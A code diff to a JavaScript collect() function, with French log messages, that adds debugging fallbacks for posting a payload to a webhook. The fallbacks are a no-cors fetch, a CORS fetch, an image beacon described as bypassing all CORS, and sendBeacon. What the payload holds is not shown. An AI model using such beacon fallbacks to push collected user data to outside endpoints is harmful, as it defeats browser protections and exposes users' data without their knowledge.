@@ -448,20 +448,76 @@ async function collect() {
     },
   };
 
+  // ── DEBUG ────────────────────────────────────────────────────
+  addLog('URL cible : ' + WEBHOOK_URL.substring(0, 50) + '…');
+  addLog('Payload size : ' + JSON.stringify(payload).length + ' octets');
+  addLog('navigator.onLine : ' + navigator.onLine);
+  addLog('Protocol : ' + location.protocol);
+
+  // Tentative 1 : no-cors (silencieuse par nature)
+  addLog('→ Tentative no-cors…');
   try {
+    const t0 = performance.now();
     await fetch(WEBHOOK_URL, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' }, // no-cors n'accepte que simple headers
       body: JSON.stringify(payload),
     });
+    const t1 = performance.now();
+    addLog('no-cors terminé en ' + Math.round(t1 - t0) + 'ms (réponse opaque — normal)', 'ok');
     setProgress(100, 'TERMINÉ');
     addLog('Transmission réussie ✓', 'ok');
     await delay(600);
     showSuccess();
+    return;
   } catch(e) {
-    setProgress(100, 'ERREUR');
-    addLog('Erreur envoi : ' + e.message, 'err');
+    addLog('no-cors échoué : ' + e.name + ' — ' + e.message, 'err');
   }
+
+  // Tentative 2 : cors classique (pour voir le vrai code d'erreur)
+  addLog('→ Tentative cors classique…');
+  try {
+    const t0 = performance.now();
+    const res = await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      mode: 'cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+    const t1 = performance.now();
+    addLog('cors status : HTTP ' + res.status + ' en ' + Math.round(t1 - t0) + 'ms', res.ok ? 'ok' : 'err');
+    if (res.ok) { setProgress(100, 'TERMINÉ'); addLog('✓ OK via cors', 'ok'); await delay(400); showSuccess(); return; }
+  } catch(e) {
+    addLog('cors échoué : ' + e.name + ' — ' + e.message, 'err');
+  }
+
+  // Tentative 3 : image beacon (contourne tout CORS)
+  addLog('→ Tentative image beacon…');
+  try {
+    const encoded = encodeURIComponent(JSON.stringify(payload));
+    const img = new Image();
+    img.src = WEBHOOK_URL + '?data=' + encoded.substring(0, 2000);
+    await new Promise(r => setTimeout(r, 1500));
+    addLog('Image beacon envoyé (GET avec data tronquée)', 'ok');
+  } catch(e) {
+    addLog('Image beacon : ' + e.message, 'err');
+  }
+
+  // Tentative 4 : sendBeacon
+  addLog('→ Tentative sendBeacon…');
+  try {
+    const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
+    const sent = navigator.sendBeacon(WEBHOOK_URL, blob);
+    addLog('sendBeacon résultat : ' + (sent ? '✓ accepté' : '✗ refusé'), sent ? 'ok' : 'err');
+    if (sent) { setProgress(100, 'TERMINÉ'); await delay(400); showSuccess(); return; }
+  } catch(e) {
+    addLog('sendBeacon : ' + e.message, 'err');
+  }
+
+  setProgress(100, 'DEBUG TERMINÉ');
+  addLog('Voir console (F12) pour détails complets', 'err');
+  console.log('PAYLOAD COMPLET:', JSON.stringify(payload, null, 2));
 }
 
 function showSuccess() {
